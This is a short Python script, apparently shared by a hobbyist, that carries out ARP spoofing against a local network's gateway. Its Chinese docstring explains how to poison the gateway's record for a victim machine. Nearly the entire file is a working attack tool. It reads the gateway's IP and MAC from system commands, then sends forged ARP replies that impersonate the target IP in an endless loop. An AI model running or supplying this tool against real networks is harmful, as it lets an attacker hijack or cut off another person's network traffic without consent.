#coding:utf-8
#FILENAME:arp.py
#coder:lovedboy
#website:lovedboy.tk
#USAGE:sudo python arp.py host
#example :sudo  python arp.py  192.168.1.103

"""
这里实现的是针对网关的欺骗。假如说，你要攻击A机器,其IP是192.168.1.100，MAC是aa:bb:cc:dd:ee:ff,这样你就可以发给网关一个伪造包，包的源IP为192.168.1.100，源MAC为00:11:22:33:44:55,这样就实现对了网关的欺骗。
"""
from scapy.all import ARP,send
import os,re,sys

def get_gateway_ip():
    t=os.popen('route -n')
    for i in t:
        if i.startswith('0.0.0.0'):
            r=re.split("\s+",i)
            return r[1]

def get_gateway_hw(ip):
    t=os.popen('arp -e %s' % ip)
    for i in t:
        if i.startswith(ip):
            r=re.split("\s+",i)
            return r[2]
 
def hack(hackip):
    ip=get_gateway_ip()
    hw=get_gateway_hw(ip)
    arp=ARP(op=2,pdst=ip,hwdst=hw,psrc=hackip)
    #os.popen('ifconfig eth0 %s' % hackip )
    while 1:
        send(arp)

def main():
    hack(sys.argv[1])
if __name__=="__main__":
    main()